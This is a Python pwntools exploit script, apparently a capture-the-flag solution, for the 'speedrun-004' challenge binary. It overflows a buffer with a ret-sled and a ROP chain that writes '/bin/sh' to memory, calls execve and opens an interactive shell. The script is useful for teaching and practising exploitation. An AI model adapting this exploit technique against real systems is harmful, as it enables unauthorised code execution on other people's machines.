from pwn import *

bin = ELF('./speedrun-004')

bss = 0x6bc0f6
pop_rax_ret = 0x415f04
pop_rdi_ret = 0x400686
pop_rsi_ret = 0x410a93
pop_rdx_ret = 0x44a155
syscall_ret = 0x474f15
mov_ret = 0x47f521  # move qword ptr [rsi], rax ; ret
ret = 0x400416

p = process('./speedrun-004')

# gdb.attach(p, 'b * 0x400c45')

p.recvuntil('how much do you have to say?\n')
p.send(str(257))

rop_chain = p64(pop_rsi_ret) + p64(bss)
rop_chain += p64(pop_rax_ret) + '/bin/sh\x00'
rop_chain += p64(mov_ret)
rop_chain += p64(pop_rax_ret) + p64(0x3b)
rop_chain += p64(pop_rdi_ret) + p64(bss)
rop_chain += p64(pop_rsi_ret) + p64(0)
rop_chain += p64(pop_rdx_ret) + p64(0)
rop_chain += p64(syscall_ret)

payload = p64(ret) * ((0x100 - len(rop_chain)) / 8)
payload += rop_chain
payload += '\x00'

p.sendafter('Ok, what do you have to say for yourself?\n', payload)
p.interactive()

